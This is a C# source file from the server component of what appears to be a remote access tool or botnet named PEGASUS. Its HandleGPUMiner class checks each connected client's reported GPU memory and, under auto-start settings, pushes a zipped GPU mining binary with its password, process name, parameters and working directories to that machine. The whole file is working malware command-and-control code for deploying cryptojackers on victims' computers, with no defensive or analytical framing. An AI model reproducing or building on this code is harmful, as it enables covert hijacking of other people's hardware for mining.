using System.IO;
using System.Threading;
using PEGASUS.Cryptografhsh;
using PEGASUS.Diadyktio;
using PEGASUS.Metafora_Dedomenon;
using PEGASUS.Properties;

namespace Server.Handle_Packet
{
	internal class HandleGPUMiner
	{
		private void ByteSend6(Clients client)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "StartGPU";
			msgPack.ForcePathObject("PROCPHOENIX").AsString = Settings.Default.gpu6_Proc;
			msgPack.ForcePathObject("ZIPPASSPHOENIX").AsString = Settings.Default.gpu6_zipPassword;
			msgPack.ForcePathObject("PARMPHOENIX").AsString = Settings.Default.gpu6_Parametrs;
			msgPack.ForcePathObject("WORKDIRPHOENIX").AsString = Settings.Default.gpu6_workDir;
			msgPack.ForcePathObject("SYSWORKDIR").AsString = Settings.Default.gpu6_sysDir;
			msgPack.ForcePathObject("DELAY").AsString = Settings.Default.gpu6_delay.ToString();
			msgPack.ForcePathObject("IDPARAMETERS").AsString = Settings.Default.gpu_idParameters.ToString();
			msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(Settings.Default.gpu6_file)));
			ThreadPool.QueueUserWorkItem(client.Send, msgPack.Encode2Bytes());
		}

		private void ByteSend4(Clients client)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "StartGPU";
			msgPack.ForcePathObject("PROCPHOENIX").AsString = Settings.Default.gpu4_Proc;
			msgPack.ForcePathObject("ZIPPASSPHOENIX").AsString = Settings.Default.gpu4_zipPassword;
			msgPack.ForcePathObject("PARMPHOENIX").AsString = Settings.Default.gpu4_Parametrs;
			msgPack.ForcePathObject("WORKDIRPHOENIX").AsString = Settings.Default.gpu4_workDir;
			msgPack.ForcePathObject("SYSWORKDIR").AsString = Settings.Default.gpu4_sysDir;
			msgPack.ForcePathObject("DELAY").AsString = Settings.Default.gpu4_delay.ToString();
			msgPack.ForcePathObject("IDPARAMETERS").AsString = Settings.Default.gpu_idParameters.ToString();
			msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(Settings.Default.gpu4_file)));
			ThreadPool.QueueUserWorkItem(client.Send, msgPack.Encode2Bytes());
		}

		public void GetGPU(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				if ((int)unpack_msgpack.ForcePathObject("GPURAM").AsInteger >= 6)
				{
					if (Settings.Default.autoStart_gpu6 && !(Settings.Default.gpu_idParameters == unpack_msgpack.ForcePathObject("IDPARAMETERS").AsString))
					{
						try
						{
							ByteSend6(client);
							return;
						}
						catch
						{
							return;
						}
					}
				}
				else if (Settings.Default.autoStart_gpu4 && !(Settings.Default.gpu_idParameters == unpack_msgpack.ForcePathObject("IDPARAMETERS").AsString))
				{
					try
					{
						ByteSend4(client);
						return;
					}
					catch
					{
						return;
					}
				}
			}
			catch
			{
			}
		}
	}
}
